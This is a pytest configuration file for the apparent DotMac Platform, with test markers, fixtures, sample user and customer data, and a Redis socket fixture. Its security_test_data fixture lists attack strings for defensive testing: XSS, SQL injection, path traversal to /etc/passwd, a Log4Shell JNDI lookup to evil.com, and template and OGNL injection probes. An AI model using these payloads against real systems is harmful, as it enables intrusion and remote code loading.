"""
Global pytest configuration for DotMac Platform.

This file provides platform-wide test fixtures, markers, and configuration
for consistent testing across all services.
"""

import asyncio
import os
from pathlib import Path
from uuid import uuid4

import pytest


def pytest_configure(config):
    """Configure pytest with custom markers and settings."""
    # Register custom markers
    config.addinivalue_line("markers", "unit: Unit tests (fast, isolated)")
    config.addinivalue_line("markers", "integration: Integration tests (medium speed)")
    config.addinivalue_line("markers", "e2e: End-to-end tests (slow, full system)")
    config.addinivalue_line("markers", "performance: Performance and load tests")
    config.addinivalue_line("markers", "security: Security-related tests")
    config.addinivalue_line("markers", "database: Database tests")
    config.addinivalue_line("markers", "api: API tests")
    config.addinivalue_line("markers", "analytics: Analytics and metrics tests")
    config.addinivalue_line("markers", "contracts: Contract testing")
    config.addinivalue_line("markers", "smoke: Smoke tests")

    # Environment markers
    config.addinivalue_line("markers", "local: Can run locally")
    config.addinivalue_line("markers", "staging: Requires staging environment")
    config.addinivalue_line("markers", "production: Production-safe tests only")

    # Stability markers
    config.addinivalue_line("markers", "stable: Stable, reliable tests")
    config.addinivalue_line("markers", "flaky: Known flaky tests")
    config.addinivalue_line("markers", "slow: Slow-running tests")


def pytest_collection_modifyitems(config, items):  # noqa: C901
    """Modify test collection to add automatic markers."""
    for item in items:
        # Add markers based on test file location
        test_path = Path(item.fspath.strpath)

        # Auto-mark based on directory structure
        if "/unit/" in str(test_path):
            item.add_marker(pytest.mark.unit)
        elif "/integration/" in str(test_path):
            item.add_marker(pytest.mark.integration)
        elif "/e2e/" in str(test_path):
            item.add_marker(pytest.mark.e2e)
        elif "/performance/" in str(test_path):
            item.add_marker(pytest.mark.performance)
        elif "/contracts/" in str(test_path):
            item.add_marker(pytest.mark.contracts)
        elif "/smoke/" in str(test_path):
            item.add_marker(pytest.mark.smoke)

        # Auto-mark based on test name patterns
        if "security" in item.name.lower():
            item.add_marker(pytest.mark.security)
        if "database" in item.name.lower() or "db" in item.name.lower():
            item.add_marker(pytest.mark.database)
        if "api" in item.name.lower():
            item.add_marker(pytest.mark.api)
        if "analytics" in item.name.lower() or "metrics" in item.name.lower():
            item.add_marker(pytest.mark.analytics)

        # Mark slow tests (over 1 second typical runtime)
        if any(keyword in item.name.lower() for keyword in ["slow", "load", "stress", "benchmark"]):
            item.add_marker(pytest.mark.slow)


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def test_tenant_id():
    """Generate a unique tenant ID for testing."""
    return uuid4()


@pytest.fixture
def test_user_id():
    """Generate a unique user ID for testing."""
    return uuid4()


@pytest.fixture
def test_request_id():
    """Generate a unique request ID for testing."""
    return str(uuid4())


@pytest.fixture
def test_correlation_id():
    """Generate a unique correlation ID for testing."""
    return str(uuid4())


@pytest.fixture
def mock_request_context(test_request_id, test_correlation_id, test_user_id, test_tenant_id):
    """Create a mock request context for testing."""
    from unittest.mock import Mock

    context = Mock()
    context.request_id = test_request_id
    context.correlation_id = test_correlation_id
    context.user_id = str(test_user_id)
    context.tenant_id = str(test_tenant_id)
    context.headers = Mock()
    context.headers.x_request_id = test_request_id
    context.headers.x_correlation_id = test_correlation_id
    context.headers.x_user_id = str(test_user_id)
    context.headers.x_tenant_id = str(test_tenant_id)

    return context


@pytest.fixture
def sample_user_data():
    """Generate sample user data for testing."""
    unique_id = uuid4().hex[:8]
    return {
        "username": f"testuser_{unique_id}",
        "email": f"test_{unique_id}@example.com",
        "first_name": "Test",
        "last_name": "User",
        "display_name": f"Test User {unique_id}",
        "is_active": True,
        "roles": ["user"],
        "created_at": "2024-01-01T00:00:00Z"
    }


@pytest.fixture
def sample_customer_data():
    """Generate sample customer data for testing."""
    unique_id = uuid4().hex[:8]
    return {
        "customer_number": f"CUS-{unique_id}",
        "display_name": f"Test Customer {unique_id}",
        "customer_type": "residential",
        "status": "active",
        "created_at": "2024-01-01T00:00:00Z",
        "contact_email": f"customer_{unique_id}@example.com",
        "contact_phone": "+1234567890"
    }


@pytest.fixture
def sample_service_data():
    """Generate sample service data for testing."""
    unique_id = uuid4().hex[:8]
    return {
        "service_name": f"Test Service {unique_id}",
        "service_type": "data",
        "plan": "premium",
        "status": "active",
        "bandwidth": "100Mbps",
        "data_limit": "unlimited"
    }


@pytest.fixture
def test_config():
    """Provide test configuration settings."""
    return {
        "test_mode": True,
        "database_url": "sqlite:///:memory:",
        "redis_url": "redis://localhost:6379/15",  # Use test database
        "log_level": "DEBUG",
        "enable_metrics": False,
        "enable_tracing": False,
        "cache_ttl": 60,
        "rate_limit": {
            "enabled": False,
            "default_limit": 1000,
            "window_seconds": 3600
        }
    }


@pytest.fixture
async def async_test_client():
    """Create an async HTTP client for testing."""
    try:
        import httpx
        async with httpx.AsyncClient() as client:
            yield client
    except ImportError:
        pytest.skip("httpx not available for async HTTP testing")


@pytest.fixture
def temp_directory():
    """Create a temporary directory for testing."""
    import shutil
    import tempfile

    temp_dir = tempfile.mkdtemp()
    yield Path(temp_dir)
    shutil.rmtree(temp_dir)


@pytest.fixture
def mock_time():
    """Mock time for consistent testing."""
    from unittest.mock import patch

    fixed_time = 1640995200.0  # 2022-01-01 00:00:00 UTC
    with patch("time.time", return_value=fixed_time):
        with patch("time.monotonic", return_value=fixed_time):
            yield fixed_time


# Performance testing fixtures
@pytest.fixture
def performance_thresholds():
    """Define performance thresholds for testing."""
    return {
        "api_response_time_ms": 200,
        "database_query_time_ms": 50,
        "cache_operation_time_ms": 10,
        "memory_usage_mb": 100,
        "cpu_usage_percent": 80
    }


@pytest.fixture
def load_test_config():
    """Configuration for load testing."""
    return {
        "concurrent_users": 10,
        "requests_per_user": 100,
        "ramp_up_time_seconds": 5,
        "test_duration_seconds": 60,
        "think_time_seconds": 1
    }


# Security testing fixtures
@pytest.fixture
def security_test_data():
    """Provide data for security testing."""
    return {
        "malicious_inputs": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%{(#_='multipart/form-data')}"
        ],
        "invalid_tokens": [
            "invalid.jwt.token",
            "expired_token_12345",
            "",
            None,
            "Bearer fake_token"
        ],
        "test_permissions": [
            "read:users",
            "write:users",
            "admin:all",
            "guest:limited"
        ]
    }


# Database testing fixtures
@pytest.fixture
async def test_database():
    """Create an isolated test database."""
    # This would be implemented based on the actual database setup
    # For now, return a mock database connection
    from unittest.mock import AsyncMock

    db = AsyncMock()
    db.fetch_one = AsyncMock()
    db.fetch_all = AsyncMock()
    db.execute = AsyncMock()
    db.begin = AsyncMock()

    return db

    # Cleanup would happen here


@pytest.fixture
def redis_socket():
    """Provide optimized Redis connection using Unix socket for speed."""
    import tempfile
    import subprocess
    import time
    from pathlib import Path
    
    # Create temporary socket file
    temp_dir = tempfile.mkdtemp()
    socket_path = Path(temp_dir) / "redis.sock"
    
    # Start Redis with Unix socket (for local testing)
    redis_proc = None
    try:
        if os.getenv("TEST_ENV") == "local":
            redis_proc = subprocess.Popen([
                "redis-server",
                "--unixsocket", str(socket_path),
                "--unixsocketperm", "700",
                "--port", "0",  # Disable TCP
                "--save", "",   # Disable persistence
                "--appendonly", "no"
            ])
            
            # Wait for socket to be available
            for _ in range(50):  # 5 second timeout
                if socket_path.exists():
                    break
                time.sleep(0.1)
            
            yield f"unix://{socket_path}"
        else:
            # Fallback to TCP for Docker/CI environments
            yield "redis://localhost:6380/0"
    
    finally:
        if redis_proc:
            redis_proc.terminate()
            redis_proc.wait()
        # Cleanup temp directory
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)


# Cleanup fixtures
@pytest.fixture(autouse=True)
def cleanup_test_artifacts():
    """Automatically cleanup test artifacts."""
    # Setup
    test_files = []

    yield test_files

    # Cleanup
    for file_path in test_files:
        if Path(file_path).exists():
            Path(file_path).unlink()


# Skip conditions
def pytest_runtest_setup(item):
    """Setup conditions for test execution."""
    # Skip tests based on environment
    if "production" in item.keywords and os.getenv("TEST_ENV") != "production":
        pytest.skip("Test requires production environment")

    if "staging" in item.keywords and os.getenv("TEST_ENV") not in ["staging", "production"]:
        pytest.skip("Test requires staging or production environment")

    # Skip performance tests in CI unless explicitly requested
    if "performance" in item.keywords and os.getenv("RUN_PERFORMANCE_TESTS") != "true":
        pytest.skip("Performance tests skipped (set RUN_PERFORMANCE_TESTS=true to enable)")


# Test timeout configuration
def pytest_timeout_global_timeout():
    """Set global timeout for all tests."""
    return 300  # 5 minutes maximum per test
